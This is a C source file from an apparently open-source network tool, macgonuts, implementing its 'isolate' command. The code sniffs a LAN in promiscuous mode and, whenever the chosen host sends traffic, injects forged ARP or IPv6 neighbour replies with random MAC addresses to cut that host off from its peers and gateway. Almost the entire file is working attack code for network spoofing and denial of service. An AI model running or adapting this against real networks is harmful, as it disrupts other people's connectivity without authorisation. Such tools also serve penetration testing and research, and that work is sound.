/*
 * Copyright (c) 2022, Rafael Santiago
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
 */
#include <cmd/macgonuts_isolate_task.h>
#include <cmd/hooks/macgonuts_isolate_init_hook.h>
#include <cmd/hooks/macgonuts_isolate_deinit_hook.h>
#include <cmd/hooks/macgonuts_isolate_done_hook.h>
#include <cmd/macgonuts_option.h>
#include <cmd/macgonuts_misc_utils.h>
#include <macgonuts_status_info.h>
#include <macgonuts_ethfrm.h>
#include <macgonuts_etherconv.h>
#include <macgonuts_ipconv.h>
#include <macgonuts_socket.h>
#include <macgonuts_socket_common.h>
#include <macgonuts_get_ethaddr.h>
#include <macgonuts_spoof.h>
#include <macgonuts_metaspoofer.h>
#include <macgonuts_routeconv.h>

static struct macgonuts_spoofing_guidance_ctx g_Spfgd[2];

static uint8_t g_GwAddr[16] = { 0 };

static size_t g_GwAddrSize = 0;

static uint8_t g_Netmask[16] = { 0 };

static int do_isolate(void);

static void sigint_watchdog(int signo);

static int fill_up_lo_info(void);

static int fill_up_tg_info(void);

static int fill_up_gw_info(void);

static int should_cut_off(const unsigned char *ethbuf, const size_t ethbuf_size);

static int get_dest_addr(uint8_t *dest_addr, const unsigned char *ethbuf, const size_t ethbuf_size);

//static int get_src_addr(uint8_t *src_addr, const unsigned char *ethbuf, const size_t ethbuf_size);

static int get_addr(uint8_t *addr, const unsigned char *ethbuf, const size_t ethbuf_size, const int is_src);

static int cut_off_route(const int should_cut_off_both);

static int is_valid_no_route_to(const char **no_route_to, const size_t no_route_to_nr);

static void fill_up_inv_spfgd(const unsigned char *ethbuf, const size_t ethbuf_size);

/*
static int send_gratuitous_arp(const macgonuts_socket_t wire,
                               const uint8_t *tg_hw_addr, const size_t tg_hw_addr_size,
                               const uint8_t *tg_proto_addr, const size_t tg_proto_addr_size);
*/

int macgonuts_isolate_task(void) {
    int err = EFAULT;
    const char *fake_pkts_amount = NULL;
    char **no_route_to = NULL;
    size_t no_route_to_nr = 0;

    memset(&g_Spfgd, 0, sizeof(g_Spfgd));

    g_Spfgd[0].usrinfo.lo_iface = macgonuts_get_option("lo-iface", NULL);
    if (g_Spfgd[0].usrinfo.lo_iface == NULL) {
        macgonuts_si_error("--lo-iface option is missing.\n");
        return EXIT_FAILURE;
    }

    g_Spfgd[0].usrinfo.tg_address = macgonuts_get_option("isle-addr", NULL);
    if (g_Spfgd[0].usrinfo.tg_address == NULL) {
        macgonuts_si_error("--isle-addr option is missing.\n");
        return EXIT_FAILURE;
    }

    fake_pkts_amount = macgonuts_get_option("fake-pkts-amount", "1");
    if (!macgonuts_is_valid_number(fake_pkts_amount) || atoi(fake_pkts_amount) == 0) {
        macgonuts_si_error("--fake-pkts-amount must be a valid number greater than zero.\n");
        return EXIT_FAILURE;
    }

    no_route_to = macgonuts_get_array_option("no-route-to", NULL, &no_route_to_nr);

    g_Spfgd[0].handles.wire = macgonuts_create_socket(g_Spfgd[0].usrinfo.lo_iface, 1);
    if (g_Spfgd[0].handles.wire == -1) {
        macgonuts_si_error("unable to create socket.\n");
        goto macgonuts_isolate_task_epilogue;
    }

    err = fill_up_tg_info();
    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to get isle host's network information.\n");
        goto macgonuts_isolate_task_epilogue;

    }

    err = fill_up_lo_info();
    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to get local host's network information.\n");
        goto macgonuts_isolate_task_epilogue;
    }

    err = fill_up_gw_info();
    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to get gateway's network information.\n");
        goto macgonuts_isolate_task_epilogue;
    }

    if (no_route_to != NULL) {
        if (!is_valid_no_route_to((const char **)no_route_to, no_route_to_nr)) {
            macgonuts_si_error("--no-route-to has invalid data.\n");
            return EXIT_FAILURE;
        }
        g_Spfgd[0].metainfo.arg[0] = no_route_to;
        g_Spfgd[0].metainfo.arg[1] = &no_route_to_nr;
    }

    g_Spfgd[0].hooks.init = macgonuts_isolate_init_hook;
    g_Spfgd[0].hooks.deinit = macgonuts_isolate_deinit_hook;
    g_Spfgd[0].hooks.done = macgonuts_isolate_done_hook;

    g_Spfgd[0].spoofing.total = atoi(fake_pkts_amount);

    signal(SIGINT, sigint_watchdog);
    signal(SIGTERM, sigint_watchdog);

    err = do_isolate();

macgonuts_isolate_task_epilogue:

    if (no_route_to != NULL) {
        macgonuts_free_array_option_value(no_route_to, no_route_to_nr);
    }

    macgonuts_release_spoof_layers_ctx(&g_Spfgd[0].layers);

    return err;
}

int macgonuts_isolate_task_help(void) {
    macgonuts_si_print("use: macgonuts isolate --lo-iface=<label> --isle-addr=<ip4|ip6>\n"
                       "                      [ --no-route-to=<ip4|ip6|cidr4|cidr6 list> --fake-pkts-amount=<n> ]\n");
    return EXIT_SUCCESS;
}

static int do_isolate(void) {
    // INFO(Rafael): The isolate mode idea is quite simple:
    //                          - sniff the network;
    //                          - if the packet sniffed has as source the address informed in --isle-addr,
    //                            inject in the network a fake mac address resolution related to the destination of it,
    //                            by jamming, cutting off the communication between the two points.
    int err = EXIT_SUCCESS;
    unsigned char ethbuf[64<<10] = "";
    ssize_t ethbuf_size = 0;
    macgonuts_hook_func init = g_Spfgd[0].hooks.init;
    macgonuts_hook_func deinit = g_Spfgd[0].hooks.deinit;
    struct no_route_to_list_ctx {
        uint8_t addr_mask[16];
    } **no_route_to_list = NULL, **np = NULL, **np_end = NULL;
    size_t no_route_to_list_nr = 0;
    char **list_item = NULL;
    char **list_end = NULL;
    size_t list_item_size = 0;
    int do_cut_off = 0;
    uint8_t and_res[16] = { 0 };
    size_t a;

    if (g_Spfgd[0].metainfo.arg[0] != NULL && g_Spfgd[0].metainfo.arg[1] != NULL) {
        no_route_to_list_nr = *(size_t *)g_Spfgd[0].metainfo.arg[1];
        no_route_to_list = (struct no_route_to_list_ctx **)
                                malloc(sizeof(struct no_route_to_list_ctx **) * no_route_to_list_nr);
        if (no_route_to_list == NULL) {
            macgonuts_si_error("unable to allocate memory for no-route list.\n");
            return EXIT_FAILURE;
        }
        memset(no_route_to_list, 0, sizeof(struct no_route_to_list_ctx **) * no_route_to_list_nr);
        np = no_route_to_list;
        np_end = np + no_route_to_list_nr;
        list_item = g_Spfgd[0].metainfo.arg[0];
        list_end = list_item + no_route_to_list_nr;
        while (list_item != list_end) {
            *np = (struct no_route_to_list_ctx *)malloc(sizeof(struct no_route_to_list_ctx));
            if (np == NULL) {
                macgonuts_si_error("unable to allocate memory for no-route list item.\n");
                err = EXIT_FAILURE;
                goto do_isolate_epilogue;
            }
            list_item_size = strlen(*list_item);
            if (macgonuts_check_ip_addr(*list_item, list_item_size)) {
                if (macgonuts_get_raw_ip_addr((*np)->addr_mask, sizeof((*np)->addr_mask),
                                              *list_item, list_item_size) != EXIT_SUCCESS) {
                    err = EXIT_FAILURE;
                    goto do_isolate_epilogue;
                }
            } else if (macgonuts_get_last_net_addr((*np)->addr_mask, *list_item, list_item_size) != EXIT_SUCCESS) {
                err = EXIT_FAILURE;
                goto do_isolate_epilogue;
            }
            list_item++;
            np++;
        }
    }

    g_Spfgd[0].hooks.init = NULL;
    g_Spfgd[0].hooks.deinit = NULL;
    g_Spfgd[0].layers.always_do_pktcraft = 1;

    assert(init != NULL && deinit != NULL);

    err = macgonuts_set_iface_promisc_on(g_Spfgd[0].usrinfo.lo_iface);

    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to set `%s` to promisc mode.\n", g_Spfgd[0].usrinfo.lo_iface);
        return EXIT_FAILURE;
    }

    init(&g_Spfgd[0], NULL, 0);

    memset(&g_Spfgd[1], 0, sizeof(g_Spfgd[1]));

    memcpy(&g_Spfgd[1].layers.spoof_hw_addr[0],
           &g_Spfgd[0].layers.tg_hw_addr[0], sizeof(g_Spfgd[1].layers.spoof_hw_addr));
    g_Spfgd[1].layers.proto_addr_version = g_Spfgd[0].layers.proto_addr_version;
    g_Spfgd[1].layers.proto_addr_size = g_Spfgd[0].layers.proto_addr_size;
    memcpy(&g_Spfgd[1].layers.spoof_proto_addr[0],
           &g_Spfgd[0].layers.tg_proto_addr[0], g_Spfgd[1].layers.proto_addr_size);
    g_Spfgd[1].layers.always_do_pktcraft = 1;

    while (!g_Spfgd[0].spoofing.abort && err == EXIT_SUCCESS) {
        ethbuf_size = macgonuts_recvpkt(g_Spfgd[0].handles.wire, ethbuf, sizeof(ethbuf));
        if (ethbuf_size == -1) {
            continue;
        }
        do_cut_off = should_cut_off(ethbuf, ethbuf_size);
        if (do_cut_off) {
            err = get_dest_addr(g_Spfgd[0].layers.spoof_proto_addr, ethbuf, ethbuf_size);
            if (macgonuts_is_outward_dest(&g_Spfgd[0].layers.spoof_proto_addr[0],
                                          &g_Netmask[0],
                                          &g_Spfgd[0].layers.lo_proto_addr[0],
                                          g_Spfgd[0].layers.proto_addr_size)) {
                memcpy(&g_Spfgd[0].layers.spoof_proto_addr[0], &g_GwAddr[0], g_GwAddrSize);
            } else if (memcmp(&g_Spfgd[0].layers.spoof_proto_addr[0],
                              &g_Spfgd[0].layers.lo_proto_addr[0],
                              g_Spfgd[0].layers.proto_addr_size) == 0) {
                memset(&g_Spfgd[0].layers.spoof_proto_addr[0], 0, g_Spfgd[0].layers.proto_addr_size);
                continue;
            }
            if (no_route_to_list != NULL) {
                do_cut_off = 0;
                np = no_route_to_list;
                do {
                    for (a = 0; a < g_Spfgd[0].layers.proto_addr_size; a++) {
                        and_res[a] = g_Spfgd[0].layers.spoof_proto_addr[a] & (*np)->addr_mask[a];
                    }
                    do_cut_off = (memcmp(g_Spfgd[0].layers.spoof_proto_addr,
                                         and_res, g_Spfgd[0].layers.proto_addr_size) == 0);
                    np++;
                } while (np != np_end && !do_cut_off);
            }
            if (!do_cut_off || err != EXIT_SUCCESS) {
                continue;
            }
            fill_up_inv_spfgd(ethbuf, ethbuf_size);
            err = cut_off_route(memcmp(&g_Spfgd[1].layers.tg_proto_addr[0],
                                       &g_Spfgd[0].layers.lo_proto_addr[0],
                                       g_Spfgd[0].layers.proto_addr_size) != 0);
        }
    }

    deinit(&g_Spfgd[0], NULL, 0);

    macgonuts_set_iface_promisc_off(g_Spfgd[0].usrinfo.lo_iface);

do_isolate_epilogue:

    if (no_route_to_list != NULL) {
        np = no_route_to_list;
        do {
            if (*np != NULL) {
                free(*np);
            }
            np++;
        } while (np != np_end);
        free(no_route_to_list);
    }

    return err;
}

static void sigint_watchdog(int signo) {
    g_Spfgd[0].spoofing.abort = 1;
}

static int fill_up_lo_info(void) {
    char addr[256] = "";

    if (macgonuts_get_addr_from_iface(addr, sizeof(addr) - 1,
                                      g_Spfgd[0].layers.proto_addr_version, g_Spfgd[0].usrinfo.lo_iface) != EXIT_SUCCESS) {
    }

    return macgonuts_get_raw_ip_addr(&g_Spfgd[0].layers.lo_proto_addr[0],
                                     g_Spfgd[0].layers.proto_addr_size,
                                     addr, strlen(addr));
}

static int fill_up_tg_info(void) {
    char addr_buf[256] = "";
    size_t tg_address_size = strlen(g_Spfgd[0].usrinfo.tg_address);
    g_Spfgd[0].layers.proto_addr_version = macgonuts_get_ip_version(g_Spfgd[0].usrinfo.tg_address, tg_address_size);
    if (g_Spfgd[0].layers.proto_addr_version != 4
        && g_Spfgd[0].layers.proto_addr_version != 6) {
        macgonuts_si_error("you gave me an ip address from outter space, I only support ip version 4 or 6.\n");
        return EXIT_FAILURE;
    }

    g_Spfgd[0].layers.proto_addr_size = (g_Spfgd[0].layers.proto_addr_version == 4) ? 4 : 16;

    if (macgonuts_get_addr_from_iface(addr_buf, sizeof(addr_buf) - 1,
                                      g_Spfgd[0].layers.proto_addr_version,
                                      g_Spfgd[0].usrinfo.lo_iface) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_get_raw_ip_addr(g_Spfgd[0].layers.lo_proto_addr,
                                  g_Spfgd[0].layers.proto_addr_size,
                                  addr_buf, strlen(addr_buf)) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_get_raw_ip_addr(g_Spfgd[0].layers.tg_proto_addr,
                                  g_Spfgd[0].layers.proto_addr_size,
                                  g_Spfgd[0].usrinfo.tg_address, tg_address_size) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_get_ethaddr(&g_Spfgd[0].layers.tg_hw_addr[0],
                              sizeof(g_Spfgd[0].layers.tg_hw_addr),
                              g_Spfgd[0].usrinfo.tg_address, tg_address_size,
                              g_Spfgd[0].handles.wire, g_Spfgd[0].usrinfo.lo_iface) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

static int fill_up_gw_info(void) {
    const int ip_version[2] = { 6, 4 };
    if (macgonuts_get_gateway_addr_info_from_iface(&g_GwAddr[0], &g_GwAddrSize,
                                                   ip_version[(g_Spfgd[0].layers.proto_addr_size == 4)],
                                                   g_Spfgd[0].usrinfo.lo_iface) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }
    return macgonuts_get_netmask_from_iface(g_Spfgd[0].usrinfo.lo_iface,
                                            strlen(g_Spfgd[0].usrinfo.lo_iface),
                                            &g_Netmask[0], ip_version[(g_Spfgd[0].layers.proto_addr_size == 4)]);
}

static int should_cut_off(const unsigned char *ethbuf, const size_t ethbuf_size) {
    uint16_t ether_type = 0;

    if (ethbuf_size < 14) {
        return 0;
    }

    ether_type = (uint16_t)ethbuf[12] << 8 |
                 (uint16_t)ethbuf[13];

    switch (g_Spfgd[0].layers.proto_addr_version) {
        case 4:
            if (ether_type != MACGONUTS_ETHER_TYPE_IP4) {
                return 0;
            }
            break;

        case 6:
            if (ether_type != MACGONUTS_ETHER_TYPE_IP6) {
                return 0;
            }
            break;

        default:
            return 0;
            break;
    }

    return (memcmp(&ethbuf[6],
                   &g_Spfgd[0].layers.tg_hw_addr[0],
                   sizeof(g_Spfgd[0].layers.tg_hw_addr)) == 0);
}

static int get_dest_addr(uint8_t *dest_addr, const unsigned char *ethbuf, const size_t ethbuf_size) {
    return get_addr(dest_addr, ethbuf, ethbuf_size, 0);
}

/*static int get_src_addr(uint8_t *src_addr, const unsigned char *ethbuf, const size_t ethbuf_size) {
    return get_addr(src_addr, ethbuf, ethbuf_size, 1);
}*/

static int get_addr(uint8_t *addr, const unsigned char *ethbuf, const size_t ethbuf_size, const int is_src) {
    uint16_t ether_type = 0;
    const unsigned char *addr_p = NULL;
    ssize_t addr_size = 0;

    if (ethbuf_size < 14) {
        return EINVAL;
    }

    ether_type = (uint16_t)ethbuf[12] << 8 |
                 (uint16_t)ethbuf[13];

    switch (ether_type) {
        case MACGONUTS_ETHER_TYPE_IP4:
            addr_p = &ethbuf[14 + 16];
            addr_size = 4;
            break;

        case MACGONUTS_ETHER_TYPE_IP6:
            addr_p = &ethbuf[14 + 24];
            addr_size = 16;
            break;

        default:
            return EINVAL;
    }

    memcpy(addr, &addr_p[(is_src) ? -addr_size : 0], addr_size);

    return EXIT_SUCCESS;
}

static int cut_off_route(const int should_cut_off_both) {
    char spoof_addr[100] = "";
    char spoof_mac[32] = "";
    int err = EXIT_SUCCESS;
    uint64_t t;

    macgonuts_raw_ip2literal(spoof_addr, sizeof(spoof_addr),
                             g_Spfgd[0].layers.spoof_proto_addr,
                             g_Spfgd[0].layers.proto_addr_size);
    g_Spfgd[0].usrinfo.spoof_address = &spoof_addr[0];

    macgonuts_getrandom_raw_ether_addr(&g_Spfgd[0].layers.lo_hw_addr[0], sizeof(g_Spfgd[0].layers.lo_hw_addr));

    for (t = 0; t < g_Spfgd[0].spoofing.total && !g_Spfgd[0].spoofing.abort && err == EXIT_SUCCESS; t++) {
        err = macgonuts_spoof(g_Spfgd[0].handles.wire, &g_Spfgd[0].layers);
        if (should_cut_off_both) {
            err = macgonuts_spoof(g_Spfgd[0].handles.wire, &g_Spfgd[1].layers);
        }
        /*
        if (err == EXIT_SUCCESS && g_Spfgd[0].layers.proto_addr_version == 4) {
            err = send_gratuitous_arp(g_Spfgd[0].handles.wire,
                                      &g_Spfgd[0].layers.lo_hw_addr[0],
                                      sizeof(g_Spfgd[0].layers.lo_hw_addr),
                                      &g_Spfgd[0].layers.spoof_proto_addr[0],
                                      g_Spfgd[0].layers.proto_addr_size);
        }
        */
    }

    if (g_Spfgd[0].spoofing.abort) {
        return err;
    }

    if (err == EXIT_SUCCESS) {
        err = g_Spfgd[0].hooks.done(&g_Spfgd[0], NULL, 0);
    } else {
        snprintf(spoof_mac, sizeof(spoof_mac) - 1,
                 "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", g_Spfgd[0].layers.lo_hw_addr[0],
                                                  g_Spfgd[0].layers.lo_hw_addr[1],
                                                  g_Spfgd[0].layers.lo_hw_addr[2],
                                                  g_Spfgd[0].layers.lo_hw_addr[3],
                                                  g_Spfgd[0].layers.lo_hw_addr[4],
                                                  g_Spfgd[0].layers.lo_hw_addr[5]);
        macgonuts_si_error("unable to spoof `%s` as `%s` on `%s`.\n", spoof_addr,
                                                                      spoof_mac,
                                                                      g_Spfgd[0].usrinfo.tg_address);
    }

    return err;
}

/*
static int send_gratuitous_arp(const macgonuts_socket_t wire,
                               const uint8_t *tg_hw_addr, const size_t tg_hw_addr_size,
                               const uint8_t *tg_proto_addr, const size_t tg_proto_addr_size) {
    struct macgonuts_spoof_layers_ctx uns_arp;
    memset(&uns_arp, 0, sizeof(uns_arp));

    uns_arp.always_do_pktcraft = 1;

    assert(tg_hw_addr_size == sizeof(uns_arp.lo_hw_addr));
    assert(tg_proto_addr_size == 4);

    uns_arp.proto_addr_size = 4;
    uns_arp.proto_addr_version = 4;
    memcpy(&uns_arp.lo_hw_addr[0], tg_hw_addr, tg_hw_addr_size);
    memcpy(&uns_arp.lo_proto_addr[0], tg_proto_addr, tg_proto_addr_size);
    memcpy(&uns_arp.spoof_proto_addr[0], tg_proto_addr, tg_proto_addr_size);
    memcpy(&uns_arp.tg_proto_addr[0], tg_proto_addr, tg_proto_addr_size);
    uns_arp.tg_hw_addr[0] =
    uns_arp.tg_hw_addr[1] =
    uns_arp.tg_hw_addr[2] =
    uns_arp.tg_hw_addr[3] =
    uns_arp.tg_hw_addr[4] =
    uns_arp.tg_hw_addr[5] = 0xFF;

    return macgonuts_spoof(wire, &uns_arp);
}
*/

static int is_valid_no_route_to(const char **no_route_to, const size_t no_route_to_nr) {
    const char **curr_entry = no_route_to;
    const char **no_route_to_end = no_route_to + no_route_to_nr;
    size_t curr_entry_size;

    while (curr_entry != no_route_to_end) {
        curr_entry_size = strlen(*curr_entry);
        if (macgonuts_get_ip_version(*curr_entry, curr_entry_size) == g_Spfgd[0].layers.proto_addr_version
            && macgonuts_check_ip_addr(*curr_entry, curr_entry_size)) {
            curr_entry++;
            continue;
        }

        if (macgonuts_get_cidr_version(*curr_entry, curr_entry_size) == g_Spfgd[0].layers.proto_addr_version
            && macgonuts_check_ip_cidr(*curr_entry, curr_entry_size)) {
            curr_entry++;
            continue;
        }

        macgonuts_si_error("`%s` seems invalid.\n", *curr_entry);
        return 0;
    }

    return 1;
}

static void fill_up_inv_spfgd(const unsigned char *ethbuf, const size_t ethbuf_size) {
    assert(ethbuf_size >= sizeof(g_Spfgd[1].layers.tg_hw_addr));
    macgonuts_getrandom_raw_ether_addr(&g_Spfgd[1].layers.lo_hw_addr[0], sizeof(g_Spfgd[1].layers.lo_hw_addr));
    memcpy(&g_Spfgd[1].layers.tg_hw_addr[0], &ethbuf[0], sizeof(g_Spfgd[1].layers.tg_hw_addr));
    memcpy(&g_Spfgd[1].layers.tg_proto_addr[0], &g_Spfgd[0].layers.spoof_proto_addr[0], g_Spfgd[1].layers.proto_addr_size);
}
